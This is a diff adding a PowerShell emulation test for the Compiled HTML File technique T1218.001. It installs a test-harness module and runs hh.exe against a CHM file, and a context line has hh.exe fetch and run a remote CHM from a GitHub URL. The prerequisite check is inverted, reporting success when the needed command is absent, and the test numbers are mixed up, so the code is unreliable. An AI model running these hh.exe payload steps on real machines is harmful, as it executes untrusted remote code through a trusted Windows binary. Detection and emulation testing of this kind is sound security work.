@@ -1,3 +1,16 @@
+T1218.001 Test 3
+###### Run with Powershell
+###### Step 1 Get Prereqs
+Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
+ 
+###### Step 2 Check Prereqs
+$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+if (-not $RequiredModule) {exit 1}
+if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {write-host "Success Check Prereq: T1218.001 - Compiled HTML File - Test 3 - Invoke CHM with default Shortcut Command " -ForegroundColor Green} else {write-host "Fail Check Prereq: T1218.001 - Compiled HTML File - Test 3 - Invoke CHM with default Shortcut Command " -ForegroundColor Red}
+
+###### Step 3 Attack
+Invoke-ATHCompiledHelp -HHFilePath $env:windir\hh.exe -CHMFilePath APT99_Test.chm
+
 '''
 hh.exe https://raw.githubusercontent.com/jsprat000/bin/main/T1218.001.chm && (Echo Success Attack: T1218.001 - Compiled HTML File - Test 2 - Compiled HTML Help Remote Payload) || (Echo Fail Attack: T1218.001 - Compiled HTML File - Test 2 - Compiled HTML Help Remote Payload)
 '''
